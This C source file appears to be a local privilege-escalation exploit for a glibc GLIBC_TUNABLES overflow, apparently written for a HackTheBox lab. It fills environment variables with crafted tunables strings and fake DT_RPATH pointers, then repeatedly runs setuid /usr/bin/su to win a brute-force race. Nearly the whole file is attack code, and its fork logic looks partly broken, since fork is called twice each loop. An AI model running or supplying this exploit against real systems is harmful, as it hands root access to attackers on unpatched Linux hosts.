#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <sys/wait.h>

int main(int argc, char* argv[]){
	char kv[0x600];
	char filler[0xd00];
	char filler2[0x600 + 0x20];
	char dt_rpath[0x20000];

	strcpy(filler, "GLIBC_TUNABLES=glibc.malloc.mxfast=");
        for (int i = strlen(filler); i < sizeof(filler) - 1; i++)
        {
		filler[i] = 'F';
        }
        filler[sizeof(filler) - 1] = '\0';

	strcpy(kv, "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=");
	for (int i = strlen(kv); i < sizeof(kv) - 1; i++)
	{
		kv[i] = 'A';
	}

        strcpy(filler2, "GLIBC_TUNABLES=glibc.malloc.mxfast=");
        for (int i = strlen(filler2); i < sizeof(filler2) - 1; i++)
        {
		filler2[i] = 'F';
	}
	filler2[sizeof(filler2) - 1] = '\0';

	for (int i = 0; i < sizeof(dt_rpath); i += 8)
	{
		*(uintptr_t *)(dt_rpath + i) = -0x14ULL;
	}
	dt_rpath[sizeof(dt_rpath) - 1] = '\0';

	char *envp[0x1000] = {
		NULL,
	};
	envp[0] = filler;
	envp[1] = kv;
	envp[0x65] = ""; // 101
	envp[0x65 + 0xb8] = "\x30\xf0\xff\xff\xfd\x7f"; // 285
	envp[0xf7f] = filler2; // 3967

	for (int i = 0; i < 0x2f; i++)
	{
		envp[0xf80 + i] = dt_rpath; // 3968 + i fram tills 47 iterationer
	}
	envp[0xffe] = "AAAA";



//	printf("filler = %s\n", filler);
//	printf("sizeof(filler) = %d\n",sizeof(filler));
//	printf("kv = %s\n", kv);
//	printf("sizeof(kv) = %d\n",sizeof(kv));
//	printf("filler2 = %s\n", filler2);
//	printf("sizeof(filler2) = %d\n",sizeof(filler2));
	//printf("dt_rpath = %s\n", dt_rpath);
	//printf("sizeof(dt_rpath) = %d\n",sizeof(dt_rpath));

	for (int i = 0; i < (sizeof(envp) / sizeof(envp[i])); i++)
	{
		//printf("INDEX %d --> %s",i, envp[i]);
	}
	char *moist[] = {"/usr/bin/su", "--help", NULL};
	//pid_t pid = execve(moist[0], moist, envp);
	int pid;
	for (int i = 0; i <= 2730; i++)
	{
		if ((pid = fork()) < 0)
		{
			printf("Fork error");
			return 0;
		}
		else if ((pid = fork()) == 0)
		{
			int fd = open("/dev/null", O_WRONLY);
				dup2(fd, 1);    /* make stdout a copy of fd (> /dev/null) */
				dup2(fd, 2);    /* ...and same with stderr */
			 	close(fd);      /* close fd */
				execve(moist[0], moist, envp);
		}
		else
		{
			printf("Parent process...");
		}

	}
	//TODO kopiera in resten av kod så fullständig envp går att läsa -  alltså den fullständiga strängen. Testa sedan manuellt på HTB
	return 0;
}
